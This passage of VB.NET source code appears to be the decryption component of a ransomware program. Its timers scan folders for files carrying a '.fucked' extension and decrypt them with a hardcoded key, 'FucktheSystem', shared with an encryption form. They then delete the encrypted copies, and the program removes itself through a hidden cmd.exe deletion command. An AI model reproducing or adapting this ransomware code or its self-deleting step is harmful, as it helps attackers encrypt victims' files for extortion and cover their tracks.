                    ListBox7.Items.Add(fdir)
                    ListBox9.Items.Add(fdir)
                Next

            Catch ex As Exception

            End Try
            ProgressBar6.Increment(1)
        End If
    End Sub

    Private Sub Timer7_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Timer7.Tick
        ProgressBar7.Maximum = ListBox9.Items.Count
        If ProgressBar7.Value = ListBox9.Items.Count Then
            Timer7.Stop()
            Timer8.Start()
        Else
            ListBox9.SelectedIndex = ProgressBar7.Value

            ListBox9.SelectionMode = SelectionMode.One
            filenamez = CStr(ListBox9.SelectedItem)
            Try

                For Each fdir As String In My.Computer.FileSystem.GetFiles(filenamez)
                    If fdir.EndsWith(".fucked") Then
                        ListBox8.Items.Add(fdir)
                    Else
                    End If

                Next

            Catch ex As Exception

            End Try
            ProgressBar7.Increment(1)
        End If
    End Sub



    Private Sub Timer8_Tick(sender As Object, e As EventArgs) Handles Timer8.Tick
        Dim filenamez As String

        ProgressBar9.Maximum = ListBox8.Items.Count
        If ProgressBar9.Value = ListBox8.Items.Count Then
            Timer1.Interval = 5000
            Timer1.Stop()
            Dim Info As New ProcessStartInfo()
            Info.Arguments = "/C choice /C Y /N /D Y /T 3 & Del """ & Application.ExecutablePath.ToString & """"
            Info.WindowStyle = ProcessWindowStyle.Hidden
            Info.CreateNoWindow = True
            Info.FileName = "cmd.exe"
            Process.Start(Info)
            Application.ExitThread()
            
           


        Else

            ListBox8.SelectedIndex = ProgressBar9.Value

            ListBox8.SelectionMode = SelectionMode.One
            filenamez = CStr(ListBox8.SelectedItem)

            Try
                'Declare variables for the key and iv.
                'The key needs to hold 256 bits and the iv 128 bits.
                Dim bytKey As Byte()
                Dim bytIV As Byte()
                'Send the password to the CreateKey function.
                bytKey = Form1.CreateKey("FucktheSystem") 'Your Decryption Key Not Password Put it Same as ENcryption Key in Form1
                'Send the password to the CreateIV function.
                bytIV = Form1.CreateIV("FucktheSystem")
                'Start the decryption.


                Dim filenamezu As String = Replace(filenamez, ".fucked", "")
                Form1.EncryptOrDecryptFile(filenamez, filenamezu, _
                                     bytKey, bytIV, Form1.CryptoAction.ActionDecrypt)
                My.Computer.FileSystem.DeleteFile(filenamez)

            Catch ex As Exception

            End Try

            ProgressBar9.Increment(1)
            Label1.Text = filenamez
            Label3.Text = filenamez
        End If
    End Sub
End Class